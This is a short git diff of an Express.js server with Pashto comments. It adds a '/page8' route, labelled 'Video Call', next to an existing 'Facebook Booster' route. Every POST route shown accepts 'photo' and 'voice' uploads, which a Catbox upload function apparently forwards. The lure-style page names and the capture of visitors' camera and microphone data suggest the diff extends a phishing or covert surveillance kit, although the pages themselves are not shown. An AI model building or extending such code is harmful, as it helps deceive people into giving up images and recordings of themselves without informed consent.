@@ -55,9 +55,13 @@ app.get('/page6', (req, res) => {
     res.sendFile(path.join(__dirname, 'index6.html'));
 });
 
-// --- نوی اضافه شوی مسیر د Facebook Booster لپاره (/page7) ---
 app.get('/page7', (req, res) => {
     res.sendFile(path.join(__dirname, 'index7.html'));
+});
+
+// --- نوی اضافه شوی مسیر د Video Call لپاره (/page8) ---
+app.get('/page8', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index8.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -99,8 +103,12 @@ app.post('/page6', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
     handleIncomingData(req, res);
 });
 
-// د نوي /page7 پاڼې پوسټ ریکویسټ
 app.post('/page7', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// د نوي /page8 پاڼې پوسټ ریکویسټ
+app.post('/page8', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
 
